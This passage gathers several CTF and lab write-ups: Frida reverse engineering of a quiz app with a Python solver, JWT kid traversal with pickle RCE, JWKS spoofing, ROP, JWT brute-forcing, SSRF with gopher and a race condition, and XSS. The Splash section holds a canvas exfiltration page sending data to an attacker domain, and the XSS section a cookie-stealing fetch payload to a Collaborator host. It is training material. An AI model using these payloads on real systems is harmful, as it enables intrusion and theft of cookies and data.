$ frida -U -f wtf.riceteacatpanda.quiz -l frida-script.js --no-pause
     ____
    / _  |   Frida 12.8.20 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `wtf.riceteacatpanda.quiz`. Resuming main thread!
[Redmi 4X::wtf.riceteacatpanda.quiz]-> 435db0475dae503ff9f8f2e829bc1eff
[67,93,-80,71,93,-82,80,63,-7,-8,-14,-24,41,-68,30,-1]
[Redmi 4X::wtf.riceteacatpanda.quiz]->
[Redmi 4X::wtf.riceteacatpanda.quiz]->
```

The results was printed after that the *play* button was pressed. The value `435db0475dae503ff9f8f2e829bc1eff` was the input of the `b` function and `[67,93,-80,71,93,-82,80,63,-7,-8,-14,-24,41,-68,30,-1]` was the output; this array was simple a byte array of the md5, and the hash was the value `requestIdentifier` of the websocket response how it was possible see on BurpSuite:

```
{"method":"question","id":"f2415db1-2e1e-4fcb-ab53-6888f827ff53","questionText":"4ZApGDm/AtyrLRr4nqXIEJglPQLbyDGUqLIHSYCSpLQB3tJwKjoSwbyhN/X5hw7x","options":["rk2Afy/3s5gU1pkkrhbvKTvyczZzMGvqNbftHMouZm+e5LsCw5dCHFwbUoAH26X8","OSXlcam6H/rRDhVDm1xz/yisctXTyUcXj2u77i+Lm8ls+0/D19ZdkHQWEB+CbQty","OSXlcam6H/rRDhVDm1xz/5Ktp6gID+qOzuZssCjmM5awEzqMhRBgK1n9AnvVhH/m","AxdN6riR1F8JUHKjovkeXeAvBJZSBUHBGWDLErPZXiWPEcVAymRtgDavF6qo/F01"],"correctAnswer":"TEUIG77TMZfiVjr7Jo6pasRXb+HvF5iZrRASO/qknY4=","requestIdentifier":"435db0475dae503ff9f8f2e829bc1eff"}
```

After obtaining the *iv* of the AES cipher, I've tried to get the key. Returning in the Game activity, I've looked to this line:

```
...
cipher.init(2, (Key)object, (AlgorithmParameterSpec)object2);
...
```

The second parameter was an object *Key*, that was the passkey of the cipher, and it was initialized in the following line in the same class:

```
object = new byte[]((byte[])object, "AES");
```

Where `object` was created by the following snippet of code:

```
...
cipher = new nx(Game.this.getIntent().getStringExtra("id"), Game.this.getResources()).a();
object = jSONObject.getString("id");
object2 = new StringBuilder();
object2.append((String)cipher);
object2.append(":");
object2.append((String)object);
object = nx.a(object2.toString());
...
```

Essentially, it was the output of `a` function of the `nx` class and his input was a string construction. Below there is the code of `a` function:

```
public static byte[] a(String string) {
    return MessageDigest.getInstance((String)"SHA-256").digest(string.getBytes());
}
```

It seemed to create a sha256 hash and return it's bytes. For confirm this, I've added the following code to my *frida* script to print the input and the output:
```
nx.a.overload('java.lang.String').implementation = function(x) {
  console.log(x);
  var tmp = this.a.call(this, x);
  console.log(JSON.stringify(tmp));
  return tmp;
}
```

Running the script I've obtained the following result:

```
$ frida -U -f wtf.riceteacatpanda.quiz -l frida-script.js --no-pause
     ____
    / _  |   Frida 12.8.20 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `wtf.riceteacatpanda.quiz`. Resuming main thread!
[Redmi 4X::wtf.riceteacatpanda.quiz]-> 09dc959d4d2339ae51907054693c9498bae57f442a4cce3cddb1c65c73cac9f8:d114f803-db55-4c61-902b-c37c5a74bfb4
[-24,-21,-126,46,-99,0,55,31,-117,124,48,52,66,-35,-32,52,52,-68,8,-114,-66,2,-109,-123,66,32,-78,69,-60,81,-105,56]
```

where in the input of `a` function there was the following string:

```
09dc959d4d2339ae51907054693c9498bae57f442a4cce3cddb1c65c73cac9f8:d114f803-db55-4c61-902b-c37c5a74bfb4
```

that was a contatenation of two string: a sha256 hash and an id value. The id value was obtained from the response, in the websocket, exactly as *requestIdentifier* for the *iv*:

```
{"method":"question","id":"d114f803-db55-4c61-902b-c37c5a74bfb4","questionText":"+hMOiUytB3RJ8t+DaPmmW6zjEy4CrMBkBYGFZYHgPJTyyb5y+VwWcv96JF002Kw9","options":["Evp2HJgs4kGAURS7X38kbw==","vbLeZJD/gktdTAC3Y5S6vQ==","byeVrqWz12iTan7TGdgDgQ==","VmBnGyexeSDjeXSX/BdntA=="],"correctAnswer":"LA1hBsCFklUfCE+gD97puvwiVed9PVTNrB4Vbu7JEBk=","requestIdentifier":"4aab40789c16c59880d1c9ff581be531"}
```

but the sha256 hash? It seemed to be computed by `nx` class from another implementation of `a` function, below reported:

```
public final String a() {
    int n2;
    byte[] arrby = this.a.openRawResource(2131427328);
    StringBuffer stringBuffer = new byte[arrby.available()];
    Object object = new byte[arrby.available()];
    arrby.read((byte[])stringBuffer);
    arrby.close();
    new ArrayList();
    int n3 = 0;
    for (n2 = 0; n2 < stringBuffer.length; ++n2) {
        double d2 = n2;
        if (Math.sqrt((double)d2) % 1.0 != 0.0) continue;
        object[(int)Math.sqrt((double)d2)] = (Object)stringBuffer[n2];
    }
    arrby = MessageDigest.getInstance((String)"SHA-256").digest((byte[])object);
    stringBuffer = new StringBuffer();
    for (n2 = n3; n2 < arrby.length; ++n2) {
        object = Integer.toHexString((int)(255 & arrby[n2]));
        if (object.length() == 1) {
            stringBuffer.append('0');
        }
        stringBuffer.append((String)object);
    }
    return this.c(String.valueOf((Object)stringBuffer));
}
```

after some investigation, I've found that the value returned by this method was computed from the hash that the app initially communicates to the server (inside the *userToken* value provided in the first websocket request), in this way both, client and server, can compute the hash used for the encryption key.

Summarizing:
* the *key* was a sha256 computed by a concatenation of two string: a sha256 value computed using *userToken* providing during the login, and the id provided by the server.
* the *iv* was a value returned by the server in *requestIdentifier*.

After obtaining the keys used for decrypt the response, I was able to create a script to respond correctly at 1000 question😆.

#### Final exploit
```
from websocket import create_connection
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder
from hashlib import sha256
import hashlib
import json
import base64

ws = create_connection("ws://challs.houseplant.riceteacatpanda.wtf:40001")
userToken = '79990edb06648800f3e23a12e720cfb888b8b989d88bc2406e7cae1c225a4566'
encoder = PKCS7Encoder()

def get_byte_array(v):
    return v.decode("hex")
    key = []
    i = 0
    while i < len(v):
        key.append(u2(int(v[i:i+2], 16)))
        i += 2
    return key

def get_key(s):
    h = hashlib.new('sha256')
    h.update(s)
    v = h.hexdigest()
    return v.decode("hex")

def first_req():
    ws.send('{"method":"ident","userToken":"c50d09de7a77de05aef6c9ae8c73d46184aaac35d49d4007d5744c40a9d33edf"}')
    result =  ws.recv()
    print "[+] Login: " + result

def play():
    ws.send('{"method":"start"}')
    result = ws.recv()
    print "[+] Play: " + result
    result = ws.recv()
    print "[+] Question: " + result
    return result

def encrypt(plaintext, key, iv):
    global encoder
    key_length = len(key)
    if (key_length >= 32):
        k = key[:32]
    elif (key_length >= 24):
        k = key[:24]
    else:
        k = key[:16]
    aes = AES.new(k, AES.MODE_CBC, iv[:16])
    pad_text = encoder.encode(plaintext)
    return aes.encrypt(pad_text)

def decrypt2(ciphertext, key, iv):
    global encoder
    key_length = len(key)
    if (key_length >= 32):
        k = key[:32]
    elif (key_length >= 24):
        k = key[:24]
    else:
        k = key[:16]
    aes = AES.new(k, AES.MODE_CBC, iv[:16])
    pad_text = aes.decrypt(ciphertext)
    return encoder.decode(pad_text)

def decrypt(data):
    data = json.loads(data)
    key = get_key(userToken + ":" + data['id'])
    iv = get_byte_array(data['requestIdentifier'])
    question = decrypt2(base64.b64decode(data['questionText']), key, iv)
    response = decrypt2(base64.b64decode(data['correctAnswer']), key, iv)
    return response

def send_answer(response, i):
    res = '{"method":"answer","answer":'
    res += str(response) + "}"
    ws.send(res)
    result = ws.recv()
    print "[+] Answer " + str(i) + ": " + result
    return result

first_req()
question = play()
response = decrypt(question)
for i in range(0, 1005):
    r = send_answer(response, i)
    response = decrypt(r)
    if "flag" in response:
        print response
        break
ws.close()
```

Finally, run it and:

```
...
[+] Answer 998: {"method":"question","id":"78fb2d08-0948-45da-a770-a8a887d52af1","questionText":"4Iwa+Y33SE5s2YBhsIhj1g9Axb9vs/OS4sRycwlDjAbAY+ap9lM0fPYhEfz2A9o0/6fWGkUZV2cOsshhGaixMEt2JEhubkjuEO27qCs/ZhI=","options":["i3hzr2C9Pf+Adhre33ZYuw==","9rH/0otiaRu/X2ET709x6g==","NBXD5whDnnmczk9lFo8e1w==","5a15RFad+AGeJaMGiaCFBw=="],"correctAnswer":"Suz8+sHJ6mRWFrkCiwQxH1OC0/zIFLSzD+tNa0uCeOI=","requestIdentifier":"7929291e08ab275681e6a83c04292852"}
[+] Answer 999: {"method":"question","id":"49bd20cf-bc6e-40a9-89d0-3ff564e74ecb","questionText":"9uQdKX982NNZD3r+uXXQyRMzcyUrNRyrcvytPv6tUuo+OmL9+hbThdcaETmQ9Y3wdinLcC63fSmtlyDBJh9J+kumzjrOYkCVvsZ6IipAZzCHCTCQulXBbWG6Ee7kg6KqTyxMkPKviRQ/5iDGHFZ5HFPttdk3n1vnINjZCOdvuYc=","options":["vmCWx2QQD3jXU9fLnyAp/w==","9Gi9KIT+RQISFKH5+yyGfw==","XYjtbIc0mfmonpl4q41lQw==","oMtrW8pMVuGQsoPmDVcsSg=="],"correctAnswer":"EKrgEUjnELC8YhGqdjE6vNCUuA0Z7f+usDM9U5oYGAo=","requestIdentifier":"28f1e57a2a5c8f9f633d7842578c0b95"}
[+] Answer 1000: {"method":"flag","flag":"rtcp{qu1z_4pps_4re_c00l_aeecfa13}"}
```



### File: ctf/2020/NahamCon_CTF/web/Bomarr_Style/README.md

## B'omarr Style, WEB 200 pti
#### Author: p4w

### TL;DR
In this challenge we have to exploit a __kid path traversal__ vulnerability in order to be able to modify and sign our jwt-token and gain RCE via pickle serialization.

### Token analysis
* The application let us create a user and login.
* If the login is successful the application give use a jwt token, let's analyze the __header__ of the token

![alt login](./screen/login.png)

* As we can see the `alg` field tell us that the __algorithm__ used to __sign__ the cookie is `HS256` (stand for hash-sha256)
* The `kid` (key identifier) parameter, which the purpose should be to identify a specific __key__ in a set of __keys__, seems to point to a file named `secret.txt`
* Analyze of the payload part of the token

![alt login](./screen/login_2.png)

* That is tricky since usually the __payload__ part of a token contains a __json__, instead in this case seems it contains some unreadable characters and for sure is not a valid json. Anyway we can still recognize some words inside it, for example the username used to login and the role.

* Let's see which bytes we have in this payload part:

![alt login](./screen/burp_decode.png)

* Seems reasonable to search for python related stuff since the response coming from the server contains the header `Server: Werkzeug/1.0.1 Python/3.6.9`, that tell us which back-end is used.

* If we search for `python serialized data example`, we can found some resource and notice that the _pattern_ of a __serialized python object__ has the same _pattern_ of our jwt-payload, then we can assume that this is the case.

### Exploit

* The general idea is to tamper the `kid` field in order to force the web-application to __verify the signature__ using a file with a __well known contents__, in this way we have the control over the key used by the web-application. If we have the ability to craft the cookie, then we can gain __RCE__ by modify the payload part with our __malicious python object__.

* To do that I build a python script. In [this](./x.py) script you can see that I picked up the `/proc/sys/kernel/randomize_va_space` file which should be present on every modern linux systems and his contents (by default) is `2\n`

  ```
  $ cat /proc/sys/kernel/randomize_va_space | xxd
  00000000: 320a                                     2.
  ```

* I exploited the RCE using blind-time-based technique to extract the __flag.txt__ contents, but reading other writeup I notice that I can use a python reverse shell payload to get a shell on the server.

### reference:
* https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks
* https://tools.ietf.org/id/draft-ietf-jose-json-web-signature-01.html
* https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
* https://en.wikipedia.org/wiki/JSON_Web_Token
* https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd
* https://root4loot.com/post/exploiting_cpickle/
* https://jwt.io/



### File: ctf/2020/NahamCon_CTF/web/Flag_Jokes/README.md

## Flag jokes, WEB 200 pti
#### Author: p4w

### TL;DR
In this challenge we have to exploit a __JWKS Spoofing__ vulnerability. This vulnerability exists if the application __trust an arbitrary url__ to retrieve the __public key__ to verify the cookie signature. An attacker can host his own public key on his malicious server in order to modify and sign the cookie with his key-pair.

### Token analysis

* The challenge let us login with any username we want, except from __admin__, and the goal is to become __admin__.
* The login phase is simple we send the username we want and the application respond with a signed jwt.
* Analysis of the jwt-cookie:

![alt cert decoder](./screen/login.png)

* Token analysis
  * As we can notice we have 3 elements into the json part of the jwt-header and you can find the details at this link https://tools.ietf.org/id/draft-ietf-jose-json-web-signature-01.html#rfc.section.4

  ![alt cert decoder](./screen/jws_spec.png)

* To summarize, the `alg` header parameter specify the algorithm used by the web-application to sign the cookie. The `kid` header parameter is used to identify a specific key in a list of keys. The `jku` header parameter is used to point to an URL which contains a set of __json encoded public keys__.

* Let's see if we can retrieve the remote `jwks.json` file pointed by the token we have
![alt cert decoder](./screen/retrive_jwks_file.png)

### Exploiting the vuln

* The general idea should be to tamper the `jkw` to point to our server hosting our `jwks.json` file with our lists of keys.

* Generate RSA key-pair with `openssl`:
  * with this command we can generate the RSA private key:
  ```
  $ openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048
  ```
  * with this command we can extract the public certificate associated to the RSA private key previously created:
  ```
  $ openssl rsa -pubout -in private_key.pem -out public_key.pem
  ```
* Now we should have both __PUBLIC__ and __PRIVATE__ certificate in our current folder and we need to extract the `n` value. To do that I used an online service:

![alt cert decoder](./screen/extract_public_key_values.png)

* Since the values for the public key contained in the `jwks.json` shold be in base64, then we need to convert the n from `hex` to `base64(raw-hex-bytes)`. To do that we can use burp-proxy:

![alt n decode](./screen/encode_n_in_b64.png)

* Create our `jwks.json` file. To do that we can just use the original one and replace the value of __n__ with the value associated with our RSA-key:

  ```
  $ cat jwks.json
  {
      "keys": [
          {
              "e": "AQAB",
              "kid": "sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc",
              "kty": "RSA",
              "n": "wed4pVV95ZD+G5s+Ahlmb96zURRK70efNvduoOPIaaFmmPRBgSLSNCEF//VntFI2l72t8IOXQQ7sS/0JbnpzjHJ4Duo6KPyE9U/Ros1z6m46w/Ncw0xMcKkLTJjswxH3Ql4kIaueN988gppGbheEvWCazbQfgR8UD54zoGd6aqO71ni3Mp81ypoU1zjq7r4OfdX4iCv/ICxC4H9RFIFDX/4AnFa6CNmOCOhP2fKarFV3iWYEPtqOsoJx2tu6YP7ecv70DVfVzR9Zd4JbQuLkNtbo+ccCFTYQp2FYFkKveh+3LbfnWY2cIQdqPGG6i57B3qQkYF2FvvEzZaIFXjbiAQ=="
          }
      ]
  }
  ```
* Now we need to modify the __jku__ value of the jwt-header to point to our server where we hosted the `jwks.json` file, and modify the payload data to become `admin`. After we can sign the cookie with our hosted RSA key-pair and to do that I used the https://jwt.io service:

![alt cert decoder](./screen/sign_jwt.png)

* Send the request to the challenge web application and get the __flag__

![alt cert decoder](./screen/get_flag.png)

### reference:
* https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks
* https://tools.ietf.org/id/draft-ietf-jose-json-web-signature-01.html#rfc.section.4
* https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
* https://jwt.io/



### File: ctf/2020/VirSecCon_CTF/pwn/return_label/README.md

* 64-bit elf with PIE protection
* the binary open and give us a leak of printf@libc
* we have a stack buffer overflow because of gets()
* calculate the libc base and evaluate the remote libc using https://libc.blukat.me/
![img ](./libc_enum.png)
* use the buf-overflow to evrwrite RIP with one_gadgets, also we full the stack with `\x00` to be sure the one_gadget work ;)
* exploit here <a href=x.py>x.py</a>
```
  $ python x.py
  [+] Opening connection to jh2i.com on port 50005: Done
  [+] leak printf: 00007f729336d800
  [+] 0x7f7293318000
  [*] Switching to interactive mode
  )?

  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x165\x93r\x7f
  $ ls -al
  total 44
  dr-xr-xr-x 1 pwn  pwn  4096 Mar 31 14:34 .
  drwxr-xr-x 1 root root 4096 Nov  8 00:37 ..
  -rw-r--r-- 1 pwn  pwn   220 Aug 31  2015 .bash_logout
  -rw-r--r-- 1 pwn  pwn  3771 Aug 31  2015 .bashrc
  -rw-r--r-- 1 pwn  pwn   655 Jul 12  2019 .profile
  -rw-r--r-- 1 root root  133 Nov  8 00:24 Makefile
  -rwxr-xr-x 1 root pwn  8888 Mar 31 14:34 challenge
  -rw-r--r-- 1 root root  330 Nov  8 00:24 challenge.c
  -rwxr-xr-x 1 root pwn    16 Mar 31 14:34 flag.txt
  $ cat flag.txt
  LLS{r0p_1s_fun}
```



### File: ctf/2020/VirSecCon_CTF/web/JaWT/README.md

## Author: p4w
## Description:
![img ](./description.png)

* we have an endpoint that give us a JWT HS256 signed cookie back
* bruteforce the cookie with this tool <a href='https://github.com/aress31/jwtcat'>jwtcat</a>

* command:
```
$ python3 jwtcat.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o -w /usr/share/wordlists/rockyou.txt
[INFO] JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.jbf34kzJ36YbWPQU69k-mlieDVmaWiIiAs6jPU1mH4o
[INFO] Wordlist: /usr/share/wordlists/rockyou.txt
[INFO] Starting brute-force attacks
jwtcat.py:110: DeprecationWarning: The 'warn' method is deprecated, use 'warning' instead
  logger.warn("Pour yourself some coffee, this might take a while..." )
[WARNING] Pour yourself some coffee, this might take a while...
[INFO] Secret key: fuckit
[INFO] Secret key saved to location: jwtpot.potfile
[INFO] Finished in 0.13006305694580078 sec
```

* so we foubnd the private key, now we can tamper the cookie and resign it. To do that I used https://jwt.io/

![img ](./tamper-jwt-cookie.png)

* now we can just set it and login with this and get the flag

* flag `LLS{jawt_was_just_what_you_thought}`



### File: ctf/2020/darkCTF/web/Chain Race/README.md

## Chain Race - Web challenge
## Author: p4w@beerpwn
#### Twitter: https://twitter.com/p4w16

## TL;DR
This challenge is about exploiting an __SSRF__ vulnerability to connect to an internal service which is vulnerable to a __race condition__.

## Challenge description
![img desc](screen/chal_desc.png)


## Solution
By opening the link given we come across a simple web-page that accept a user input. It expect an __URL__ as parameter and it will make a request to the given URL, then the results will be printed back to the page.

![img desc](screen/test_google.png)

This smell like __SSRF__ vulnerability, indeed if we try to input this simple payload http://127.0.0.1/, we can fetch the index page.
By using a proxy we can see that the requests will be sent to a PHP script `testhook.php`.

![img desc](screen/ssrf_poc_burp.png)

So the technology should be PHP, and we have an SSRF. Next step is to try if we can actually use other protocols such as `file://`, `gopher://`...\
Let's start with `file://`, since will be useful if we can leak some files from the server.
Following the challenge description, I started with the source code:

![img desc](screen/source_ssrf.png)

So that confirm that the application use php-curl to fetch our input, also there isn't any check on our input.\
Next file that I extracted was the `passwd` since we can potentially find some useful information about users on the system.

![img passwd](screen/discover_hidden_service_via_passwd.png)

As we can see it seems that there is an account `localhost8080` that seems related to another __hidden-service__. Here I just trusted, that the port of the service could be __8080__ since is contained in the name.\
So let's try to make an __http__ request to `http://127.0.0.1:8080/`:

![img hidde-service](screen/source.png)

Nice, there is another __php web application binded to localhost__. By reading the code associated we can see that it will give us the __flag__ but only if we pass some __checks__.\
Let's highlight the source code where the checks are done:

![img hidde-service](screen/source_debug.png)

 So to get the flag we need to pass these checks against this condition `if (($_GET['secret'] == "0x1337")	|| $_GET['user'] == "admin") {   die("nope"); }`:
 * `strcmp($_GET['user'],"admin") ? 1 : 0;`
 * `strcasecmp($_GET['secret'], "0x1337") == 0`
 * `unlink($temp_name)`

For the first and the second one we can just read the php-docs for the function `strcmp` and `strcasecmp`

![img strcmp](screen/strcmp.png)

Looking at return value of this function, to bypass the check we just need to pass a longer string then `admin` like `adminA`

![img bypass_1](screen/bypass_1.PNG)

![img strcasecmp](screen/strcasecmp.png)

To bypass this we can just notice that `strcasecmp` is __case insensitive__, then we can use `0X1337` to bypass this one.

![img bypass_2](screen/bypass_2.png)

The last one is the most tricky. In order to get the flag, it's necessary that the `unlink()` will fail. One reason for unlink to fail is to unlink a non existent file. We can test this behavior with php-cli:

![img unlink](screen/unlink_fail.png)

Let's analyze how the filename is created, this is the line of code responsible for that:\
```$temp_name = sha1(md5(date("ms").$_COOKIE['PHPSESSID']));```
The first thing to notice is that the __randomness__ of `$temp_name` is given by 2 thing, the first the `date()` function and the second one from the `PHPSESSID`.
By testing the date function we can notice that the precision is the second.

![img hidde-service](screen/date.png)

So that, if we make two distinct requests in a short period of time we will eventually get the same value from the `date("ms")` function. So theoretically this can be solved by using two process that will make the request separately.\
The last problem to solve is the `PHPSESSID` value. If we make a request with the `http` protocol, we can't control the `PHPSESSID` cookie value that will be generated by the `session_start`, but we have `gopher://` wrapper and with that we can craft an entire http request containing our chosen `PHPSESSID`!
Let's test this part.\
Testing locally with some debug, notice the PHPSESSID value
![img hidde-service](screen/test_locally.png)
Testing __gopher__ on remote server
![img hidde-service](screen/ssrf_gopher_decoded.png)
![img hidde-service](screen/ssrf_gopher.png)

Nice, all seems to work. Now, to explain why the race condition can eventually solve the challenge and retrieve the flag, I've done this image that should explain how the race condition work.

![img race](screen/flow.png)

## Flag time

Let's go with race condition, for that I used burp intruder

![img race](screen/race_cond_flag.png)

Cheers p4w!



### File: ctf/2020/pbctf/Sploosh/README.md

## Sploosh - Web challenge - pbctf 2020
## Author: p4w@beerpwn
### Twitter: https://twitter.com/p4w16

## TL;DR
This challenge is about exploiting an __SSRF__ vulnerability along with __Splash__ (javascript rendering service).

## Challenge description
![img desc](screen/desc.png)


## Solution
Once connected to the challenge, the index page show a link where it is possible to download the source code.
Here it follow the docker configuration file for the challenge:

![img desc](screen/docker_compose.png)

The application is pretty simple, basically we have 3 file: __index.php__, __flag.php__ and __api.php__.
The __index.php__ page doesn't contain anything important, so I'll only show the __api.php__ and __flag.php__ pages.
<br>

This is the source for __api.php__
![img desc](screen/api.png)

and this the source code of __flag.php__
![img desc](screen/flag_source.png)

As we can see in __api.php__, it's possible to control the `url` GET parameter and if it is passed, then script will execute `file_get_contents` with the `http` wrapper to the host `splash`.
With a bit of googling it's possible to discover the service behind the scene. The repository of the splash project can be found here
* https://github.com/scrapinghub/splash

As it is possible to observe that to get the flag it's necessary to request the `flag.php` file, but the flag will be printed out only if the remote address that is requesting the resource is __172.16.0.13__ or __172.16.0.14__. At this point and considering what we have I start to thinking that I need some kind of __SSRF__ to retrieve the flag. Trigger the __SSRF__ is pretty easy in this situation, since no check is made on the `url` parameter, we can just pass arbitrary address in it. Problem is that the __SSRF__ is blind, I'm going to show what I mean with some screen.

![img desc](screen/google_req.png)

Here for example I used google.com domain as endpoint, but in the response we don't have all the page contents retrieved from google, instead only the geometry is present. At this point I start to looking more closely to the __Splash__ documentation (https://splash.readthedocs.io/en/stable/api.html).
Also referring to the `api.php` resource, it's possible to notice that the `url` parameter is __urlencoded__ before concatenation, this stop us to directly inject additional parameters on the query itself (`& -> %26`).
By reading the documentation we can notice that the __Splash API__ can be used along with many parameters. The first one that caught my attention was the `lua_source` parameter that can be passed to the `/execute` API endpint to run custom lua script. Searching more information about that I discover this article https://paper.seebug.org/354/ that explain how __Splash__ works. One thing that tell us is that we can't actually run arbitrary lua code since is sand-boxed for security reason.
Before going more in deep on the __Splash API__, let's see how it is possible to full control a request over the splash endpoint by exploiting the `url` parameter. The trick is simple we can just pass a full request to the internal address:
* `url=http://172.16.0.13:8050/render.html%3furl=http://example.com/`

With this payload it is possible to force the the application to make a request to the `render.html` API endpoint that will generate another request to the domain `example.com`. Let's verify that:

![img desc](screen/webhook_req.png)
![img desc](screen/webhook.png)

Works fine, at this point I knew that I was able to fully control a request to the splash endpoint along with any parameter I want to use. The first idea was to use the `lua_source` parameter to inject some lua script to leak the flag. I tried that solution, unfortunately I fail so I start to read more documentation.
The __Splash__ service have many endpoints that can be used to fetch pages such as `/render.jpeg`.

![img desc](screen/render_jpeg_docs.png)

At this point I start thinking for a chain that can be use to retrieve the flag by using this functionality. The basic idea that I had was to embed an `<img>` tag in a page controlled by me and pointing to the `/render.jpeg` endpoint with the `url` parameter `http://172.16.0.14/flag.php`. After that I can leak the contents with some JavaScript code.

This is the code I used to do that:

```
<html>
  <body>
    <script>
      function exfil(){
        var c = document.getElementById("myCanvas");
        var ctx = c.getContext("2d");
        var img = document.getElementById("preview");
        ctx.drawImage(img, 30, 30);
        var i = new Image();
        i.src="http://<yourdomain-here>:9999/exfil?data="+btoa(c.toDataURL());
      }
    </script>
    <img id="preview" src="http://172.16.0.13:8050/render.jpeg?url=http://172.16.0.14/flag.php" onload="exfil()">
    <canvas id="myCanvas" />
  </body>
</html>
```

To make this work, I just play a bit with the `api.php` page and come up with this payload:
```
GET /api.php?url=http://172.16.0.13:8050/render.html%3furl=http://<yourdomain-here>:8000/exploit.php HTTP/1.1
...
```
basically the first request goes to the `/render.json` endpoint that is used inside the `api.php`, then a request for `/render.html` is generated along with the `url` parameter pointing to my domain where I hosted the page showed before.
You can look the exploit working during the CTF in the screenshots below.

![img desc](screen/SSRF.png)
![img desc](screen/recv_connection.png)
![img desc](screen/flag_recv.png)

After that we can just decode the base64 and we get the flag rendered in a jpeg file!

![img desc](screen/flag.png)



### File: ctf/2020/securinets_CTF/pwn/README.md

### Author: p4w

* binary analysis:
```
  $ file ./main
  main: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=bca3291bae283d68f245ce737825504c707a8751, for GNU/Linux 3.2.0, not stripped
```
* vulnerability:
We have a one byte off vulnerability affecting the stack. Basically we can override the last byte of the saved `Base Pointer` (EBP).
The overflow happen inside the `check_status` function which is called by the `main` function.
So that we have two `leave, ret` instruction after the overflow.
This will lead to a a <b>stack pivot</b>.

* exploit: pivot the stack upper, we populate the upper part with a `ret sladge` gadgets to increase the chanche, leak address and the restart execution to `call system('/bin/sh')`.

Exploit <a href="./x.py">here</a>.



### File: ctf/2022/Wolvsec-ctf-2022/web/README.md

## XSS 401 - Web challenge

![alt desc](./chal-desc.png)

#### Author: p4w

### Solution
We can spot the __XSS__ vuln. by reading the code:

![alt fuzz](./XSS-in-src.png)

As you can notice the url parameter is passed as an argument to the URL constructor. So we have a potential __XSS__ through the __URL.hostname__. The problem is to reach the __vulnerable code at line 75__ we don't let the application failing and trigger an exception when the `new URL(url)` (line 62) is called.

__XSS__ Limitation, we can't use the following list of characters:
* no white space (`\x20`)
* no slashes (`/`) or backslashes (`\`)
* no `@`, `\x0c`, `:`, ....
* null byte (`\x00`) and \n (`\x0a`) will be stripped out
* only lowercase letters (JavaScript is case sensitive, html is not)

Bypass for the space character between the tag name and attributes can be done using `\x0c`. You can find this result using a simple fuzzer like the following ([fuzzer link here](./fuzzer.html)).

![alt fuzz](./fuzzer.png)

Here there is few screen-shots showing that `alert(1337)` function got executed:

![alt fuzz](./XSS-burp-PoC.png)

![alt fuzz](./XSS-PoC.png)

From there is just question of creativity to build a working payload and steal the admin cookie.

![alt fuzz](./XSS-burp.png)

__XSS__ payload url-decoded, the `\x0c` character is not printable but is there :D
```
http://<html><body><imgsrc="0"onerror="fetch(location.href.substr(0,8)+'2or6d71urhtbh5vl2247o9xz2q8mwb.burpcollaborator.net'+location.href.substr(7,1)+document.cookie)">
```

__XSS__ payload:
```
http://%3Chtml%3E%3Cbody%3E%3Cimg%0Csrc=%220%22onerror=%22fetch(location.href.substr(0,8)%2b%272or6d71urhtbh5vl2247o9xz2q8mwb.burpcollaborator.net%27%2blocation.href.substr(7,1)%2bdocument.cookie)%22%3E
```

__JavaScript__ code to leak the cookie (all lowercase):
```
fetch(location.href.substr(0,8)+'2or6d71urhtbh5vl2247o9xz2q8mwb.burpcollaborator.net'+location.href.substr(7,1)+document.cookie)
```

__Final__ payload (submit to the bot this URL, double URL encode the second part):
```
https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/visit?url=http%3a//%253Chtml%253E%253Cbody%253E%253Cimg%250Csrc%3d%25220%2522onerror%3d%2522fetch(location.href.substr(0,8)%252b%25272or6d71urhtbh5vl2247o9xz2q8mwb.burpcollaborator.net%2527%252blocation.href.substr(7,1)%252bdocument.cookie)%2522%253E
```

Leaking the flag:

![alt fuzz](./get-flag.png)



### File: ctf/CVE/CVE-2019-13571/README.md

# CVE-2019-13571
### Vulnerability discoverer: p4w
The affected software is a WP plugin named `Advanced Contact form 7 DB`.
In here you can find a POC for `CVE-2019-13571` that I discovered during my research.
You can find the original report and all the details in <a href="./report.pdf">this</a> pdf file.
Cheers!

p4w



### File: ctf/HTB_machines/Obscurity/README.md

# Obscurity Writeup (HTB box)

## AUTHOR: bytevsbyte
Twitter: [@bytevsbyt3](https://twitter.com/bytevsbyt3)  
HTB Profile: [bytevsbyte](https://www.hackthebox.eu/profile/27835)

## TL;DR
This is a straightforward linux machine of 30 points on HackTheBox platform. The box has only two ports open, require a little enumeration of the web service and presents a custom web server. There are a lot of python, and it must be used along the way to get a shell on the box, to bypass some crypto and to understand what happens.

## FULL STORY
Start with the  `nmap -sC -sV -p- -T4 10.10.10.168 | tee nmap.txt` :
```
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
